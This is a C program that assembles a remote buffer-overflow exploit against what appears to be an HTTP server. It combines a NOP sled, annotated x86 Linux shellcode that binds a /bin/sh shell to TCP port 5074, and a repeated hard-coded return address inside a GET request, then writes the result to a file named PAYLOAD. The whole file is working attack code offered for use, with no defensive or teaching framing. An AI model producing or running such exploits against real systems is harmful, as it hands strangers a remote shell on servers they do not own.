#include <string.h> 
#include <stdlib.h>
#include <stdio.h>


/* 
 * s0t4ipv6@Shellcode.com.ar
 * x86 portbind a shell in port 5074
 * 92 bytes.
 *
 */

char shellcode[] =
"\x31\xc0"			// xorl		%eax,%eax
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x89\xc3"			// movl		%eax,%ebx
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x31\xd2"			// xorl		%edx,%edx
"\x52"				// pushl	%edx
"\x66\x68\x13\xd2"		// pushw	$0xd213
"\x43"				// incl		%ebx
"\x66\x53"			// pushw	%bx
"\x89\xe1"			// movl		%esp,%ecx
"\x6a\x10"			// pushl	$0x10
"\x51"				// pushl	%ecx
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x40"				// incl		%eax
"\x89\x44\x24\x04"		// movl		%eax,0x4(%esp,1)
"\x43"				// incl		%ebx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x83\xc4\x0c"			// addl		$0xc,%esp
"\x52"				// pushl	%edx
"\x52"				// pushl	%edx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x93"				// xchgl	%eax,%ebx
"\x89\xd1"			// movl		%edx,%ecx
"\xb0\x3f"			// movb		$0x3f,%al
"\xcd\x80"			// int		$0x80
"\x41"				// incl		%ecx
"\x80\xf9\x03"			// cmpb		$0x3,%cl
"\x75\xf6"			// jnz		<shellcode+0x40>
"\x52"				// pushl	%edx
"\x68\x6e\x2f\x73\x68"		// pushl	$0x68732f6e
"\x68\x2f\x2f\x62\x69"		// pushl	$0x69622f2f
"\x89\xe3"			// movl		%esp,%ebx
"\x52"				// pushl	%edx
"\x53"				// pushl	%ebx
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x0b"			// movb		$0xb,%al
"\xcd\x80"			// int		$0x80
;

char ret_address[] = "\x0C\xBF\xF9\xF9";
char nops[] = "\x90";

int main() {
   //printf("%s\n", shellcode);

    int i;
    char* attack_string = (char *)malloc(4096*sizeof (char));
   
   	strcat(attack_string, "echo -e \x22GET /"); 
    
    for (i= 0; i < 500; i++) {
        strcat(attack_string, nops);
    }

    strcat(attack_string,shellcode);

    for (i = 0; i < 60; i++) {
        strcat(attack_string, ret_address);
    }
    strcat(attack_string," HTTP\x22");

    //printf("%s\n", attack_string);
    printf("%ld\n",strlen(attack_string));
    FILE *fp = fopen("PAYLOAD", "w");
    fprintf(fp, "%s", attack_string);
    fclose(fp);
}
